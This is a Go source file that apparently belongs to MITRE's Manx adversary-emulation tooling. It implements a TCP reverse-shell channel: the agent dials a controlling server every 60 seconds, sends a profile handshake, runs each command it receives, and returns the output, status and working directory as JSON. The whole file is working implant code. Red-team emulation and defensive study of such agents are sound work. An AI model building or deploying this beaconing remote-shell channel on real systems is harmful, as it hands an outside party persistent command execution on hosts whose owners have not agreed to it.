package sockets

import (
	"bufio"
	"fmt"
	"net"
	"time"
	"strings"
	"os"
	"encoding/json"

	"github.com/mitre/manx/shells/commands"
	"github.com/mitre/manx/shells/util"
	"github.com/mitre/manx/shells/output"
)

//TCP communication
type TCP struct {}

func init() {
	CommunicationChannels["tcp"] = TCP{}
}

//Listen through a new socket connection
func (contact TCP) Listen(port string, server string, inbound int, profile map[string]interface{}) {
	for {
	   conn, err := net.Dial("tcp", port)
	   if err != nil {
		  output.VerbosePrint(fmt.Sprintf("[-] %s", err))
	   } else {
		   handshake(conn, profile)
		   output.VerbosePrint(fmt.Sprintf("[+] TCP established for %s", profile["paw"]))
		   listen(conn, profile, server)
	   }
	   time.Sleep(60 * time.Second)
	}
 }

func listen(conn net.Conn, profile map[string]interface{}, server string) {
    scanner := bufio.NewScanner(conn)
    for scanner.Scan() {
        message := scanner.Text()
		bites, status, commandTimestamp := commands.RunCommand(strings.TrimSpace(message), server, profile)
		pwd, _ := os.Getwd()
		response := make(map[string]interface{})
		response["response"] = string(bites)
		response["status"] = status
		response["pwd"] = pwd
		response["agent_reported_time"] = util.GetFormattedTimestamp(commandTimestamp, "2006-01-02T15:04:05Z")
		jdata, _ := json.Marshal(response)
		conn.Write(jdata)
    }
}

func handshake(conn net.Conn, profile map[string]interface{}) {
	//write the profile
	jdata, _ := json.Marshal(profile)
    conn.Write(jdata)
	conn.Write([]byte("\n"))

	//read back the paw
    data := make([]byte, 512)
    n, _ := conn.Read(data)
    paw := string(data[:n])
    conn.Write([]byte("\n"))
	profile["paw"] = strings.TrimSpace(string(paw))
}
